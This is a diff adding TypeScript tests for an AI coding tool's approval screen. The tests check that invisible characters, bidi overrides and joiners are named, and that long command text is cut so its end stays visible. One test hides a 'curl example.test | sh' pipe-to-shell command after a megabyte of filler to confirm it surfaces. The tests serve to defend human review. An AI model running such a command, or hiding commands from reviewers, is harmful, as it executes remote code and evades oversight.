@@ -22,8 +22,11 @@ import {
   createChildThreadApprovalsAtom,
   type PendingThreadRequests,
   derivePendingThreadRequests,
+  APPROVAL_TEXT_LIMIT,
+  approvalTextParts,
   declinePendingApprovals,
   sendApprovalFeedback,
+  pushHooksApprovalRows,
   makeThreadRequestsResolvedAnnouncer,
   onThreadRequestsResolved,
   pruneResolvedUserInputDrafts,
@@ -133,6 +136,62 @@ describe("declining approvals before sending", () => {
   });
 });
 
+describe("a push hooks approval", () => {
+  const pushHooks = {
+    branch: "feature/greeting",
+    files: [".husky/pre-push"],
+    commands: [{ name: "checks", command: "pnpm run checks" }],
+  };
+  const pending = (item: { readonly pushHooks: typeof pushHooks } | { readonly appName: string }) =>
+    derivePendingThreadRequests({
+      runtimeRequests: [{ ...projection.runtimeRequests[0]!, kind: "mcp-elicitation" }],
+      turnItems: [
+        {
+          id: TurnItemId.make("push-hooks-approval-item"),
+          threadId: v2Projection.thread.id,
+          runId: null,
+          nodeId,
+          providerThreadId: null,
+          providerTurnId: null,
+          nativeItemRef: null,
+          parentItemId: null,
+          ordinal: 0,
+          status: "waiting",
+          title: null,
+          startedAt: v2Now,
+          completedAt: null,
+          updatedAt: v2Now,
+          type: "approval_request",
+          requestId,
+          requestKind: "mcp-elicitation",
+          prompt: "Push feature/greeting and run this repository's hook file .husky/pre-push?",
+          ...item,
+        },
+      ],
+    }).approvals[0]!;
+
+  it("carries what T3 Code names and no app, and another server's request its app", () => {
+    const own = pending({ pushHooks });
+    expect(own.pushHooks).toEqual(pushHooks);
+    expect(own).not.toHaveProperty("appName");
+    expect(own.detail).toBe(
+      "Push feature/greeting and run this repository's hook file .husky/pre-push?",
+    );
+
+    const other = pending({ appName: "deploys" });
+    expect(other.appName).toBe("deploys");
+    expect(other).not.toHaveProperty("pushHooks");
+  });
+
+  it("lists the branch, then each hook file and configured hook", () => {
+    expect(pushHooksApprovalRows(pushHooks)).toEqual([
+      { label: "Branch", code: "feature/greeting" },
+      { label: "Hook file", code: ".husky/pre-push" },
+      { label: "Configured hook", name: "checks", code: "pnpm run checks" },
+    ]);
+  });
+});
+
 describe("pruning resolved user input drafts", () => {
   const answered = userInputDraftKey("env", "thread", "answered");
   const pending = userInputDraftKey("env", "thread", "pending");
@@ -196,14 +255,20 @@ describe("announcing resolved thread requests", () => {
     using recorder = record();
     const announce = makeThreadRequestsResolvedAnnouncer(environmentId, threadId);
 
-    announce([first]);
-    announce([first, second]);
-    announce([first, second]);
-    announce([second]);
+    const pending = (id: RuntimeRequestId) => ({ id, status: "pending" as const });
+    announce([pending(first)]);
+    announce([pending(first), pending(second)]);
+    announce([pending(first), pending(second)]);
+    announce([{ id: first, status: "cancelled" }, pending(second)]);
+    announce([
+      { id: first, status: "cancelled" },
+      { id: second, status: "resolved" },
+    ]);
 
     expect(recorder.events).toEqual([
-      { environmentId, threadId, pendingRequestIds: [first] },
-      { environmentId, threadId, pendingRequestIds: [second] },
+      { environmentId, threadId, pendingRequestIds: [first], unansweredRequestIds: [] },
+      { environmentId, threadId, pendingRequestIds: [second], unansweredRequestIds: [first] },
+      { environmentId, threadId, pendingRequestIds: [], unansweredRequestIds: [first] },
     ]);
   });
 });
@@ -635,4 +700,249 @@ it("loads only child approvals and retains their destination across environments
   expect(readDetails).not.toHaveBeenCalled();
   unmount();
   registry.dispose();
+});
+
+it("names the characters of an approval that a screen would not draw", () => {
+  const named = (text: string) =>
+    approvalTextParts(text)
+      .parts.map((part) => (part.named ? `<${part.text}>` : part.text))
+      .join("");
+  expect(named("echo one\rtwo\r\n\tthree")).toBe("echo one<\\r>two<\\r>\n\tthree");
+  expect(named("a\b\u001B[2K\u0000\u007F\u0085\u000B\u000C")).toBe(
+    "a<\\b\\e>[2K<U+0000U+007FU+0085U+000BU+000C>",
+  );
+  expect(named("a b c‮d⁧e​f‍g\u{E0072}")).toBe(
+    "a<U+2028>b<U+2029>c<U+202E>d<U+2067>e<U+200B>f<U+200D>g<U+E0072>",
+  );
+  expect(named("a︀ a\u{E0100} é͏ ㅤ a᠋ ᠎ ؜")).toBe(
+    "a<U+FE00> a<U+E0100> é<U+034F> <U+3164> a<U+180B> <U+180E> <U+061C>",
+  );
+  // Every drawn character stays: plain text, accents, a line feed and a tab.
+  const drawn = "git commit -m 'café é 漢字 نمی'\n\tgit push";
+  expect(approvalTextParts(drawn).parts).toEqual([{ text: drawn }]);
+  expect(approvalTextParts("")).toEqual({
+    parts: [],
+    tail: [],
+    shownLength: 0,
+    hiddenLength: 0,
+    length: 0,
+  });
+});
+
+it("leaves a joiner or a presentation selector alone only inside an emoji", () => {
+  const named = (text: string) =>
+    approvalTextParts(text)
+      .parts.map((part) => (part.named ? `<${part.text}>` : part.text))
+      .join("");
+  const unchanged = (text: string) => expect(approvalTextParts(text).parts).toEqual([{ text }]);
+
+  // A joiner directly between two emoji, after the first one's selector or skin tone too.
+  unchanged("\u{1F469}‍\u{1F4BB} \u{1F9D1}\u{1F3FD}‍\u{1F4BB} \u{1F44B}\u{1F3FD}");
+  unchanged("\u{1F3F3}️‍\u{1F308} \u{1F441}️‍\u{1F5E8}️");
+  // A presentation selector directly after an emoji or in a keycap.
+  unchanged("❤️ ❤︎ 1️⃣ #️⃣");
+
+  // The same characters anywhere else, in every script.
+  expect(named("نمی‌خواهم ه‍")).toBe("نمی<U+200C>خواهم ه<U+200D>");
+  expect(named("क्‍ष क्‌ष")).toBe("क्<U+200D>ष क्<U+200C>ष");
+  expect(named("ᠮ᠋ 葛\u{E0100} 辻︀")).toBe("ᠮ<U+180B> 葛<U+E0100> 辻<U+FE00>");
+  expect(named("cat 'safe—‍.txt' é‍x ‍a‍")).toBe(
+    "cat 'safe—<U+200D>.txt' é<U+200D>x <U+200D>a<U+200D>",
+  );
+  expect(named("a️b︎ 1️ 1︎⃣ 漢️ ️")).toBe("a<U+FE0F>b<U+FE0E> 1<U+FE0F> 1<U+FE0E>⃣ 漢<U+FE0F> <U+FE0F>");
+  // An emoji on one side only, a non-joiner, and a second joiner or selector.
+  expect(named("\u{1F469}‍.txt x‍\u{1F4BB} \u{1F469}‌\u{1F4BB} \u{1F469}‍")).toBe(
+    "\u{1F469}<U+200D>.txt x<U+200D>\u{1F4BB} \u{1F469}<U+200C>\u{1F4BB} \u{1F469}<U+200D>",
+  );
+  expect(named("\u{1F469}‍‍\u{1F4BB} ❤️️")).toBe("\u{1F469}<U+200DU+200D>\u{1F4BB} ❤️<U+FE0F>");
+  // A skin tone is a drawn character, not an emoji to join or to select a presentation of.
+  expect(named("a\u{1F3FD}‍\u{1F4BB} \u{1F469}‍\u{1F3FD} \u{1F44B}\u{1F3FD}️")).toBe(
+    "a\u{1F3FD}<U+200D>\u{1F4BB} \u{1F469}<U+200D>\u{1F3FD} \u{1F44B}\u{1F3FD}<U+FE0F>",
+  );
+  // A code point reserved for an emoji that does not exist yet is not an emoji.
+  expect(named("\u{1FC00}\uFE0F \u{1FC00}\u200D\u{1F4BB} \u{1F469}\u200D\u{1FC00}")).toBe(
+    "\u{1FC00}<U+FE0F> \u{1FC00}<U+200D>\u{1F4BB} \u{1F469}<U+200D>\u{1FC00}",
+  );
+  // Tag characters are named, in a flag as well.
+  expect(named("\u{1F3F4}\u{E0067}\u{E0062}\u{E007F}")).toBe("\u{1F3F4}<U+E0067U+E0062U+E007F>");
+});
+
+it("merges named characters that stand together into one part", () => {
+  expect(approvalTextParts("a\r\r\u200Db\u001B\nc\b").parts).toEqual([
+    { text: "a" },
+    { text: "\\r\\rU+200D", named: true },
+    { text: "b" },
+    { text: "\\e", named: true },
+    { text: "\nc" },
+    { text: "\\b", named: true },
+  ]);
+  // A joiner inside an emoji is not named and ends the run before it.
+  expect(approvalTextParts("\r\u{1F469}\u200D\u{1F4BB}\u200D\r").parts).toEqual([
+    { text: "\\r", named: true },
+    { text: "\u{1F469}\u200D\u{1F4BB}" },
+    { text: "U+200D\\r", named: true },
+  ]);
+});
+
+it("shows the beginning and the end of approval text that passes its limit", () => {
+  const limit = { length: 8, namedRuns: 2, tailLength: 3, tailNamedRuns: 1 };
+  const read = (parts: ReadonlyArray<{ text: string; named?: true }>) =>
+    parts.map((part) => (part.named ? `<${part.text}>` : part.text)).join("");
+  const scan = (text: string) => {
+    const { parts, tail, hiddenLength } = approvalTextParts(text, limit);
+    return [read(parts), hiddenLength, read(tail)];
+  };
+  // Under the limit or at it, all of the text.
+  expect(scan("abcdefg")).toEqual(["abcdefg", 0, ""]);
+  expect(scan("abcdefgh")).toEqual(["abcdefgh", 0, ""]);
+  expect(scan("a\r\rb\rc")).toEqual(["a<\\r\\r>b<\\r>c", 0, ""]);
+  // Over it, the beginning and the end, which together are as long as the limit.
+  expect(scan("abcdefghi")).toEqual(["abcde", 1, "ghi"]);
+  expect(scan("abcdefghijklmnop sh x")).toEqual(["abcde", 13, "h x"]);
+  // Neither cut falls inside a code point.
+  expect(scan("abcd\u{1F469}fgh")).toEqual(["abcd", 2, "fgh"]);
+  expect(scan("abcdefg\u{1F469}h")).toEqual(["abcde", 2, "\u{1F469}h"]);
+  expect(scan("abcdef\u{1F469}hi")).toEqual(["abcde", 3, "hi"]);
+  // Characters in the end are named like those in the beginning, and its runs are the last ones.
+  expect(scan("abcdefg\r‮")).toEqual(["abcde", 1, "g<\\rU+202E>"]);
+  expect(scan("abcdefg\ra\r")).toEqual(["abcde", 3, "a<\\r>"]);
+  // Past the runs of the beginning, the text up to the next run and then the end.
+  expect(scan("\ra\rb\rcde")).toEqual(["<\\r>a<\\r>b", 1, "cde"]);
+  // An end that starts where the beginning stopped leaves nothing out, so the text is whole.
+  expect(scan("a\rb\rc\rd")).toEqual(["a<\\r>b<\\r>c<\\r>d", 0, ""]);
+
+  // Whatever the length, the two parts are the two ends of the text and no code point is split.
+  const unit = "a\u{1F469}bc\u{1F4BB}";
+  for (let length = 0; length <= 3 * unit.length; length += 1) {
+    const text = unit
+      .repeat(3)
+      .slice(0, length)
+      .replace(/[\uD800-\uDBFF]$/, "");
+    const { parts, tail, shownLength, hiddenLength } = approvalTextParts(text, limit);
+    expect(read(parts)).toBe(text.slice(0, shownLength));
+    expect(read(tail)).toBe(hiddenLength > 0 ? text.slice(shownLength + hiddenLength) : "");
+    expect(hiddenLength > 0).toBe(text.length > limit.length);
+    expect(`${read(parts)}|${read(tail)}`).not.toMatch(/\p{Cs}/u);
+  }
+});
+
+it("names a character a screen would not draw wherever it stands, the very end included", () => {
+  const read = (parts: ReadonlyArray<{ text: string; named?: true }>) =>
+    parts.map((part) => (part.named ? `<${part.text}>` : part.text)).join("");
+  const whole = (text: string) => {
+    const scan = approvalTextParts(text);
+    expect([scan.tail, scan.hiddenLength, scan.shownLength]).toEqual([[], 0, text.length]);
+    return read(scan.parts);
+  };
+  expect(whole("ls\r")).toBe("ls<\\r>");
+  expect(whole("ls\r\n")).toBe("ls<\\r>\n");
+  expect(whole("ls\n\r")).toBe("ls\n<\\r>");
+  expect(whole("ls\u200D")).toBe("ls<U+200D>");
+  // Text made only of such characters is one named part.
+  expect(whole("\r")).toBe("<\\r>");
+  expect(approvalTextParts("\r\u200D\u001B\r").parts).toEqual([
+    { text: "\\rU+200D\\e\\r", named: true },
+  ]);
+
+  // The same where long text is cut: 5 units of beginning, 3 of end.
+  const limit = { length: 8, namedRuns: 2, tailLength: 3, tailNamedRuns: 1 };
+  const cut = (text: string) => {
+    const { parts, tail, hiddenLength } = approvalTextParts(text, limit);
+    return [read(parts), hiddenLength, read(tail)];
+  };
+  // The last unit of the text.
+  expect(cut("abcdefgh\r")).toEqual(["abcde", 1, "gh<\\r>"]);
+  expect(cut("abcdefg\r\n")).toEqual(["abcde", 1, "g<\\r>\n"]);
+  expect(cut("abcdefg\n\r")).toEqual(["abcde", 1, "g\n<\\r>"]);
+  expect(cut("abcdefgh\u200D")).toEqual(["abcde", 1, "gh<U+200D>"]);
+  // The last unit of the beginning and the first unit of the end.
+  expect(cut("abcd\rfghi")).toEqual(["abcd<\\r>", 1, "ghi"]);
+  expect(cut("abcd\u200Dfghi")).toEqual(["abcd<U+200D>", 1, "ghi"]);
+  expect(cut("abcdef\rhi")).toEqual(["abcde", 1, "<\\r>hi"]);
+  expect(cut("abcdef\u200Dhi")).toEqual(["abcde", 1, "<U+200D>hi"]);
+  // A joiner the cut parts from its emoji is named on the side it stays on.
+  expect(cut("ab\u{1F469}\u200D\u{1F4BB}xyz")).toEqual(["ab\u{1F469}<U+200D>", 2, "xyz"]);
+  expect(cut("abcd\u{1F469}\u200D\u{1F4BB}")).toEqual(["abcd", 2, "<U+200D>\u{1F4BB}"]);
+  // Only such characters, in the whole text or in its end.
+  expect(cut("\r".repeat(9))).toEqual(["<\\r\\r\\r\\r\\r>", 1, "<\\r\\r\\r>"]);
+  expect(cut("abcdefghi\r\u200D\r")).toEqual(["abcde", 4, "<\\rU+200D\\r>"]);
+
+  // At every length, short or cut, the last thing shown is the name of the last character.
+  for (const [end, name] of [
+    ["\r", "<\\r>"],
+    ["\r\n", "<\\r>\n"],
+    ["\n\r", "\n<\\r>"],
+    ["\u200D", "<U+200D>"],
+  ] as const) {
+    for (let length = 0; length <= 20; length += 1) {
+      const scan = approvalTextParts("x".repeat(length) + end, limit);
+      expect(read(scan.hiddenLength > 0 ? scan.tail : scan.parts).endsWith(name)).toBe(true);
+    }
+    const long = approvalTextParts("x".repeat(APPROVAL_TEXT_LIMIT.length) + end);
+    expect(long.hiddenLength).toBe(end.length);
+    expect(read(long.tail).endsWith(name)).toBe(true);
+  }
+});
+
+it("bounds the parts of a megabyte of approval text and still shows what it ends with", () => {
+  const { length, namedRuns, tailLength, tailNamedRuns } = APPROVAL_TEXT_LIMIT;
+  const size = 1 << 20;
+  const count = (text: string) => {
+    const { parts, tail, shownLength, hiddenLength } = approvalTextParts(text);
+    return [
+      [parts.length, parts.filter((part) => part.named).length, shownLength],
+      [tail.length, tail.filter((part) => part.named).length],
+      hiddenLength,
+    ];
+  };
+  // Just under the limit, at it and just over it.
+  expect(count("a".repeat(length - 1))).toEqual([[1, 0, length - 1], [0, 0], 0]);
+  expect(count("a".repeat(length))).toEqual([[1, 0, length], [0, 0], 0]);
+  expect(count("a".repeat(length + 1))).toEqual([[1, 0, length - tailLength], [1, 0], 1]);
+
+  expect(count("a".repeat(size))).toEqual([[1, 0, length - tailLength], [1, 0], size - length]);
+  expect(count("‍".repeat(size))).toEqual([[1, 1, length - tailLength], [1, 1], size - length]);
+  // Every other character named: the first runs, and the last ones.
+  expect(count("a\r".repeat(size / 2))).toEqual([
+    [2 * namedRuns + 1, namedRuns, 2 * namedRuns + 1],
+    [2 * tailNamedRuns, tailNamedRuns],
+    size - (2 * namedRuns + 1) - 2 * tailNamedRuns,
+  ]);
+
+  // A command that stands only after a megabyte of anything is in the end, its characters named.
+  for (const filler of ["a", "\r", "a\r", "\u{1F469}‍"]) {
+    const { parts, tail } = approvalTextParts(
+      `echo ok ${filler.repeat(size / filler.length)}\ncurl example.test | sh‮`,
+    );
+    expect(parts[0]?.text.startsWith("echo ok")).toBe(true);
+    expect(tail.slice(-2)).toEqual([
+      { text: expect.stringMatching(/\ncurl example\.test \| sh$/) },
+      { text: "U+202E", named: true },
+    ]);
+  }
+});
+
+it("splits a megabyte of approval text the same way as a short one", () => {
+  const size = 1 << 20;
+  const fill = (unit: string) => unit.repeat(size / unit.length);
+  const count = (text: string) => {
+    const { parts } = approvalTextParts(text, {
+      length: 2 * size,
+      namedRuns: size,
+      tailLength: 0,
+      tailNamedRuns: 0,
+    });
+    return [parts.length, parts.filter((part) => part.named).length];
+  };
+  // A long run of marks before one joiner, and a long run of joined emoji with one left open.
+  expect(count(`1${fill("\u094D")}\u200D`)).toEqual([2, 1]);
+  expect(count(fill("\u{1F469}\u200D"))).toEqual([2, 1]);
+  expect(count(fill("\u{1F469}\u{1F3FD}\u200D\u{1F4BB}"))).toEqual([1, 0]);
+  // Nothing but joiners, selectors or carriage returns: one run.
+  expect(count(fill("\u200D"))).toEqual([1, 1]);
+  expect(count(fill("\uFE0F"))).toEqual([1, 1]);
+  expect(count(fill("\r"))).toEqual([1, 1]);
+  // Every other character named: one run each.
+  expect(count(fill("a\r"))).toEqual([size, size / 2]);
+  expect(count(fill("a"))).toEqual([1, 0]);
 });
